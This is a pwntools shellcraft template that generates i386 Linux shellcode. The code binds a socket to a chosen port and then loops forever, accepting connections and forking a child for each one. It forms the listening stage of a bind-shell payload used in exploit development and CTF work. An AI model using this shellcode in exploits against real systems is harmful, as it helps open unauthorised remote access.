<%
  from pwnlib.shellcraft import common
  from pwnlib.shellcraft import i386
  from socket import htons
%>
<%page args="port"/>
<%docstring>
    Args: port
    Waits for a connection.  Leaves socket in EBP.
    ipv4 only
</%docstring>
<%
  acceptloop = common.label("acceptloop")
  looplabel = common.label("loop")
%>

${acceptloop}:
        /*  Listens for and accepts a connection on ${int(port)}d forever */
        /*  Socket file descriptor is placed in EBP */

        /*  sock = socket(AF_INET, SOCK_STREAM, 0) */
        ${i386.linux.mov('eax', 'SYS_socketcall')}
        ${i386.linux.mov('ebx', 'SYS_socketcall_socket')}
        cdq                     /*  clear EDX */
        push edx                /*  IPPROTO_IP (= 0) */
        push ebx                /*  SOCK_STREAM */
        push AF_INET
        ${i386.linux.syscall('eax', 'ebx', 'esp')}

        /*  bind(sock, &addr, sizeof addr); // sizeof addr == 0x10 */
        push edx
        /* ${htons(port)} == htons(${port}) */
        ${i386.linux.push('AF_INET | (%d << 16)' % htons(port))}
        mov ecx, esp
        push 0x10
        push ecx
        push eax
        mov ecx, esp
        mov esi, eax
        inc ebx                 /*  EBX = bind (= 2) */
        mov al, SYS_socketcall
        int 0x80

        /*  listen(sock, whatever) */
        mov al, SYS_socketcall
        mov bl, SYS_socketcall_listen
        int 0x80


${looplabel}:
        /*  accept(sock, NULL, NULL) */
        push edx
        push esi                /*  sock */
        mov ecx, esp
        mov al, SYS_socketcall
        mov bl, SYS_socketcall_accept
        int 0x80

        mov ebp, eax

        mov al, SYS_fork
        int 0x80
        xchg eax, edi

        test edi, edi
        mov ebx, ebp
        cmovz ebx, esi /*  on child we close the server sock instead */

        /*  close(sock) */
        ${i386.linux.syscall('SYS_close', 'ebx')}

        test edi, edi
        jnz ${looplabel}
